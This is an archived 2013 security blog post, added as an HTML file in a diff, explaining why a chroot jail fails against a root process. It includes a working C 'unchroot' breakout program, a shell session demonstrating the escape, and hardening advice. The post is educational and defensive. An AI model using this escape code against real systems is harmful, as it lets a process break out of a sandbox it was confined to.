@@ -1,0 +1,266 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Escaping a chroot jail/1 | PyTux</title>
+  <meta name="author" content="Filippo Valsorda">
+
+  
+  <meta name="description" content="Everybody will tell you that a chroot jail (that is, making a process think that a directory is instead the root folder, and not letting it access or &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="https://filippo.io/escaping-a-chroot-jail-slash-1/">
+
+  <link href="../stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="https://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="https://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">PyTux</a></h1>
+  
+    <h2>Trips of a curious penguin.</h2>
+  
+</hgroup>
+
+
+</header>
+
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+<header style="background-color: gold;padding: 30px;">
+  Hello, time traveler! You are reading an article that is <em>almost ten years old</em>. The world has changed, and so have I and my opinions. <strong>There is a good chance what's below is not current, correct, or secure anymore, and maybe it never was.</strong> This page is preserved because I am an archivist at heart, but you have been warned.
+</header>
+  
+  <header>
+    
+      
+        <h1 class="entry-title">Escaping a chroot jail/1</h1>
+      
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2013-10-14T10:00:00+01:00" pubdate data-updated="true" class="updated">Oct 14<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Everybody will tell you that a <a href="https://en.wikipedia.org/wiki/Chroot#Uses">chroot jail</a> (that is, making a process think that a directory is instead the root folder, and not letting it access or modify anything outside of that) is ineffective against a process with root privileges<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> (UID 0). Let’s see why.</p>
+
+<!-- more -->
+
+<p>The escape basically works like this:</p>
+
+<ul>
+  <li>
+    <p>We create a temporary folder (I named mine <code>.42</code>, hidden not to draw too much attention) and we <code>chroot</code> to that, this way we make sure our current working directory is outside the fake root, and we can do so because we’re <del>CEO</del>root, Bitch<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>;</p>
+  </li>
+  <li>
+    <p>then we <code>chroot</code> to parent folders all the way up to the root (we don’t need to worry about going too up, <code>/../../.. == /</code>);</p>
+  </li>
+  <li>
+    <p>finally we spawn something, a shell, <code>rm -rf</code>, whatever.</p>
+  </li>
+</ul>
+
+<p>Q: Why couldn’t we just do <code>chroot("../../../../../../..")</code> and call it a day?<br />
+A: Because even if the kernel does not want to keep us from doing what we want (we’re root, after all) it will keep faith to the chroot also with us and if from inside the chroot jail we ask to <code>chroot("..")</code> the kernel will regularly expand <code>/..</code> to <code>/</code>. It has to do so, some programs might rely on that. So we have to move our working directory outside of the root before proceeding.</p>
+
+<div><script src="https://gist.github.com/6976188.js?file=unchroot.txt"></script>
+<noscript><pre><code>$ echo 1337 | sudo tee /FLAG
+1337
+$ mkdir chroot
+$ cd chroot/
+$ mkdir bin etc lib var home
+$ ln -s lib lib64
+$ ldd /bin/sh
+    linux-vdso.so.1 =&gt;  (0x00007fffa9c83000)
+    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a29106000)
+    /lib64/ld-linux-x86-64.so.2 (0x00007f9a294d8000)
+$ cp /bin/sh bin
+$ cp /lib/x86_64-linux-gnu/libc.so.6 lib
+$ cp /lib64/ld-linux-x86-64.so.2 lib
+$ tree
+.
+├── bin
+│   └── sh
+├── etc
+├── home
+├── lib
+│   ├── ld-linux-x86-64.so.2
+│   └── libc.so.6
+├── lib64 -&gt; lib
+└── var
+
+6 directories, 3 files
+$
+$ cat &gt; unchroot.c
+#include &lt;sys/stat.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    mkdir(&quot;.42&quot;, 0755);
+    chroot(&quot;.42&quot;);
+    chroot(&quot;../../../../../../../../../../../../../../../..&quot;);
+    return execl(&quot;/bin/sh&quot;, &quot;-i&quot;, NULL);
+}
+$ gcc -static -o unchroot unchroot.c
+$
+$ sudo chroot . /bin/sh
+# ls
+/bin/sh: 1: ls: not found
+# ./unchroot
+# ls
+bin    dev   home            lib         media  proc  sbin     sys  var
+boot   etc   initrd.img      lib64       mnt    root  selinux  tmp  vmlinuz
+cdrom  FLAG  initrd.img.old  lost+found  opt    run   srv      usr  vmlinuz.old
+# cat FLAG
+1337
+#</code></pre></noscript></div>
+
+<h2 id="other-pitfalls">Other pitfalls</h2>
+
+<p>If <code>chroot()</code> changes also the working directory to be inside the jail this will make it impossible to pop outside by just chrooting to a sub-directory, but this will not stop us.</p>
+
+<p>We can simply grab the file descriptor of the current directory before the first chroot call and then <a href="http://linux.die.net/man/2/fchdir"><code>fchdir()</code></a> to that. <code>chroot()</code> <a href="http://linux.die.net/man/2/chroot">does not close file descriptors</a>.</p>
+
+<p>Also, if the root privileges were incorrectly dropped, for example by calling <a href="http://linux.die.net/man/2/seteuid"><code>seteuid()</code></a>, a call to <code>setuid(0)</code> might be useful in restoring them.</p>
+
+<h2 id="so-how-does-a-correct-chroot-look-like">So, how does a correct chroot look like?</h2>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+</pre></td><td class="code"><pre><code class="c"><span class="line"><span class="n">assert</span><span class="p">(</span><span class="n">UID</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class="line"><span class="n">chdir</span><span class="p">(</span><span class="s">&quot;jail&quot;</span><span class="p">);</span>
+</span><span class="line"><span class="n">chroot</span><span class="p">(</span><span class="s">&quot;.&quot;</span><span class="p">);</span>
+</span><span class="line"><span class="n">setuid</span><span class="p">(</span><span class="n">UID</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>And make sure that there are no <a href="https://en.wikipedia.org/wiki/Setuid"><code>setuid</code></a> binaries inside the jail<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>!</p>
+
+<h2 id="a-catch-all-compile-everywhere-c-unchroot">A catch-all compile-everywhere C <code>unchroot</code></h2>
+
+<div><script src="https://gist.github.com/6976188.js?file=unchroot.c"></script>
+<noscript><pre><code>#include &lt;sys/stat.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+
+int main() {
+    int dir_fd, x;
+    setuid(0);
+    mkdir(&quot;.42&quot;, 0755);
+    dir_fd = open(&quot;.&quot;, O_RDONLY);
+    chroot(&quot;.42&quot;);
+    fchdir(dir_fd);
+    close(dir_fd);  
+    for(x = 0; x &lt; 1000; x++) chdir(&quot;..&quot;);
+    chroot(&quot;.&quot;);  
+    return execl(&quot;/bin/sh&quot;, &quot;-i&quot;, NULL);
+}</code></pre></noscript></div>
+
+<div class="footnotes">
+  <ol>
+    <li id="fn:1">
+      <p>Or even just the CAP_SYS_CHROOT privilege (that self-chroot jailing processes often forget to drop), most of the cases we just need to be able to run <code>chroot()</code>.<a href="#fnref:1" rel="reference">&#8617;</a></p>
+    </li>
+    <li id="fn:2">
+      <p><a href="http://galeri4.uludagsozluk.com/105/im-ceo-bitch_182484.jpg">Ahem</a>.<a href="#fnref:2" rel="reference">&#8617;</a></p>
+    </li>
+    <li id="fn:3">
+      <p><code>find / -type f \( -perm -4000 -o -perm -2000 \)</code><a href="#fnref:3" rel="reference">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+</div>
+
+  
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Filippo Valsorda</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2013-10-14T10:00:00+01:00" pubdate data-updated="true" class="updated">Oct 14<span>th</span>, 2013</time>
+      
+
+
+
+
+    </p>
+    
+
+  </footer>
+</article>
+
+
+
+</div>
+
+
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - Filippo Valsorda
+</p>
+
+<!-- Piwik tag removed -->
+
+</footer>
+  
+
+</body>
+</html>
